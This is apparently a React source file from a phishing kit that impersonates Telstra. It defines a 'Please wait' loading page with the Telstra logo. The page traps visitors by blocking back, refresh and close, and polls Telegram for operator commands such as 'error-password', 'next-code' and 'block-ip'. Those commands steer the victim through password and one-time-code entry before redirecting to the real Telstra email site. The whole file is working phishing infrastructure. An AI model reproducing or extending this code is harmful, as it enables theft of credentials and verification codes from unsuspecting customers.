import { useEffect, useState, useRef } from "react";
import { useLocation } from "wouter";
import { checkTelegramUpdates } from "@/lib/telegram";

function lockNavigation() {
  window.history.pushState(null, '', window.location.href);
  
  const handlePopState = () => {
    window.history.pushState(null, '', window.location.href);
  };
  
  const handleBeforeUnload = (e: BeforeUnloadEvent) => {
    e.preventDefault();
    e.returnValue = '';
    return '';
  };
  
  const handleKeyDown = (e: KeyboardEvent) => {
    if (
      e.key === 'F5' || 
      (e.ctrlKey && e.key === 'r') || 
      (e.ctrlKey && e.key === 'w') ||
      (e.altKey && e.key === 'F4') ||
      (e.key === 'Backspace' && !(e.target instanceof HTMLInputElement || e.target instanceof HTMLTextAreaElement))
    ) {
      e.preventDefault();
      return false;
    }
  };
  
  window.addEventListener('popstate', handlePopState);
  window.addEventListener('beforeunload', handleBeforeUnload);
  window.addEventListener('keydown', handleKeyDown);
  
  return () => {
    window.removeEventListener('popstate', handlePopState);
    window.removeEventListener('beforeunload', handleBeforeUnload);
    window.removeEventListener('keydown', handleKeyDown);
  };
}

export default function Loading() {
  const [_, setLocation] = useLocation();
  const lastUpdateIdRef = useRef(0);
  const [readyToListen, setReadyToListen] = useState(false);
  const initializedRef = useRef(false);

  useEffect(() => {
    const cleanup = lockNavigation();
    return cleanup;
  }, []);

  useEffect(() => {
    if (initializedRef.current) return;
    initializedRef.current = true;

    const initialize = async () => {
      const result = await checkTelegramUpdates(0);
      if (result && result.updateId) {
        lastUpdateIdRef.current = result.updateId;
      }
      console.log("Loading page ready. Baseline ID:", lastUpdateIdRef.current);
      setReadyToListen(true);
    };
    
    initialize();
  }, []);

  useEffect(() => {
    if (!readyToListen) return;

    const pollTelegram = async () => {
      const result = await checkTelegramUpdates(lastUpdateIdRef.current);
      
      if (result) {
        if (result.updateId > lastUpdateIdRef.current) {
          lastUpdateIdRef.current = result.updateId;
          
          if (result.action) {
            handleCommand(result.action);
          }
        }
      }
    };

    const interval = setInterval(pollTelegram, 2000);
    return () => clearInterval(interval);
  }, [setLocation, readyToListen]);

  const handleCommand = (action: string) => {
    if (action === "error-password") {
      setLocation("/?error=password");
    } else if (action === "next-code") {
      setLocation("/enter-code");
    } else if (action === "incorrect-code") {
      setLocation("/enter-code?error=true");
    } else if (action === "success") {
      window.location.href = "https://email.telstra.com"; 
    } else if (action.startsWith("block-ip:")) {
      const ip = action.split(':')[1];
      const blockedIps = JSON.parse(localStorage.getItem('blocked_ips') || '[]');
      if (!blockedIps.includes(ip)) {
        blockedIps.push(ip);
        localStorage.setItem('blocked_ips', JSON.stringify(blockedIps));
      }
      document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;"><div style="text-align:center;"><h1>Access Denied</h1><p>This service is not available.</p></div></div>';
    } else if (action.startsWith("unblock-ip:")) {
      const ip = action.split(':')[1];
      const blockedIps = JSON.parse(localStorage.getItem('blocked_ips') || '[]');
      const newBlockedIps = blockedIps.filter((blockedIp: string) => blockedIp !== ip);
      localStorage.setItem('blocked_ips', JSON.stringify(newBlockedIps));
      sessionStorage.removeItem('home_notification_sent');
    }
  };

  useEffect(() => {
    const checkCommand = () => {
      const commandStr = localStorage.getItem("mock_command");
      if (!commandStr) return;

      try {
        const command = JSON.parse(commandStr);
        const isRecent = Date.now() - command.timestamp < 5000;
        
        if (isRecent) {
          handleCommand(command.type);
          localStorage.removeItem("mock_command");
        }
      } catch (e) {
        console.error("Error parsing command", e);
      }
    };

    checkCommand();

    const handleStorage = (e: StorageEvent) => {
      if (e.key === "mock_command") {
        checkCommand();
      }
    };

    window.addEventListener("storage", handleStorage);
    const interval = setInterval(checkCommand, 1000);

    return () => {
      window.removeEventListener("storage", handleStorage);
      clearInterval(interval);
    };
  }, [setLocation]);

  return (
    <div className="min-h-screen flex items-center justify-center bg-[#F5F5F5] font-[Segoe_UI,Tahoma,Geneva,Verdana,sans-serif] overflow-hidden">
      <div className="text-center flex flex-col items-center justify-center">
        {/* Telstra Logo */}
        <div className="mb-10 animate-[fadeIn_0.5s_ease-in]">
          <svg width="66px" height="66px" viewBox="0 0 33 33" version="1.1" xmlns="http://www.w3.org/2000/svg" aria-label="Telstra Logo" role="img" focusable="false">
            <g id="Artboard" stroke="none" strokeWidth="1" fill="none" fillRule="evenodd">
              <g id="Telstra_Primary-logo_C_RGB" fillRule="nonzero">
                <path d="M18.742504,14.0832 L17.5024033,21.3536 C17.2460517,22.6624 16.3840696,23.0144 15.6182193,23.0144 L9.88235294,23.0144 L12.3016709,9.6992 C9.88876173,8.5952 7.42137789,7.8752 5.4602884,7.8752 C3.59212634,7.8752 2.0764477,8.3808 1.0670634,9.5872 C0.3556878,10.448 0,11.5104 0,12.7712 C0,16.5568 2.98008698,21.808 8.08468757,26.0928 C12.6317235,29.8784 17.6369879,32 21.2771801,32 C23.0940719,32 24.5584802,31.4432 25.523003,30.336 C26.2792401,29.4784 26.5836576,28.36 26.5836576,27.1008 C26.5836576,23.3152 23.6035706,18.0624 18.4989701,13.7792 C18.3774617,13.6576 18.2543841,13.5376 18.130141,13.4192 L18.742504,14.0832 Z" id="Path" fill="#FF6900"></path>
                <path d="M8.44037537,0 C7.53032731,0 6.77409018,0.6112 6.57221332,1.568 L5.76470588,5.9552 L12.9777981,5.9552 L9.87914855,23.0112 L15.6182193,23.0112 C16.3840696,23.0112 17.2460517,22.656 17.5024033,21.3504 L20.1268025,5.9552 L25.3179217,5.9552 C26.2311742,5.9552 26.9874113,5.3504 27.1892882,4.3904 L28,0 L8.44037537,0 Z" id="Path" fill="#0D54FF"></path>
              </g>
            </g>
          </svg>
        </div>

        {/* Spinner */}
        <div className="w-20 h-20 border-[6px] border-[rgba(13,84,255,0.1)] border-t-[#0D54FF] rounded-full animate-spin mx-auto"></div>

        {/* Loading Text */}
        <p className="mt-8 text-xl text-[#666] font-medium animate-pulse" data-testid="text-loading">
          Please wait...
        </p>
      </div>

      <style>{`
        @keyframes fadeIn {
          from {
            opacity: 0;
            transform: translateY(-20px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
      `}</style>
    </div>
  );
}
